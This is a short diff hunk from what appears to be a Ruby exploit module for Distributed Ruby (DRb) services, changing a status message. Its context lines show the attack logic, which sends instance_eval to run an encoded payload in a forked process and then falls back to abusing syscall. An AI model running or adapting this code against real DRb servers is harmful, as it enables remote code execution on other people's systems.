@@ -18,7 +18,7 @@ class DRbExploit
       puts 'Trying to exploit instance_eval'
       p.send(:instance_eval, "Kernel.fork { `#{payload.encoded}` }")
     rescue SecurityError => e
-      puts 'Instance eval failed, trying to exploit syscall'
+      puts 'Instance eval failed! Trying to exploit syscall.. Hope you are listening on port #{lport}'
       filename = "." + rand_text_alphanumeric(16)
       begin
         j = p.send(:syscall, 20)
